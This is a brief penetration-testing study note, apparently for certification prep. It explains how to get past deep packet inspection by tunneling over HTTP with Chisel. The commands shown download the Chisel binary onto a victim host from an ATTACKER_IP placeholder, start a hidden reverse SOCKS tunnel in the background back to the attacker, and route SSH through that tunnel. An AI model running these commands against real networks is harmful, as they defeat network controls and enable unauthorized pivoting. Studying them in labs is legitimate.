Deep packet inspection devices may be configured to only allow specific transport protocols into, out of, or across the network. For example, a network administrator could create a rule that terminates any outbound SSH traffic. If they implemented that rule, all connections that use SSH for transport would fail, including any SSH port redirection and tunneling strategies we had implemented.
# HTTP Tunneling
If DPI is blocking a lot of stuff, maybe it lets HTTP through?
## Chisel
Chisel does HTTP Tunneling.
### Steps
1. Transfer chisel to target:
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
```
```bash
gunzip chisel_1.8.1_linux_amd64.gz
```
```bash
python -m http.server 80
```
On target:
```bash
wget $(ATTACKER_IP)/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```
2. Run chisel
Kali:
```bash
chisel server --port 8080 --reverse
```
Victim machine:
```bash
/tmp/chisel client $(ATTACKER_IP):8080 R:socks > /dev/null 2>&1 &
```
3. SSHing through chisel
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' $(SSH_USER)@$(REMOTE_IP)
```
REMEMBER TO ADD TO /etc/proxychains4.conf:
```
socks5 127.0.0.1 1080
```
